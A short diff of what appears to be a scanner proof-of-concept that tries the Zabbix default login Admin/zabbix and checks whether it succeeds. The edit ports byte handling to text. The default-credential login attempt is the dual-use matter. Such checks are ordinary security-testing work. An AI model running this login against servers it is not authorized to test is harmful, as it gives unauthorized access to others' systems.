@@ -50,13 +50,13 @@ def poc(url):
     try:
         s = requests.session()
         c = s.get(url, timeout=10, headers=h1)
-        dic = _get_static_post_attr(c.content)
+        dic = _get_static_post_attr(c.text)
         dic['name'] = 'Admin'
         dic['password'] = 'zabbix'
         r = s.post(url + '/index.php', data=dic, headers=h2, timeout=10)
-        if 'chkbxRange.init();' in r.content:
+        if 'chkbxRange.init();' in r.text:
             for each in blacklist:
-                if each in r.content:
+                if each in r.text:
                     return False
             return True
         return False
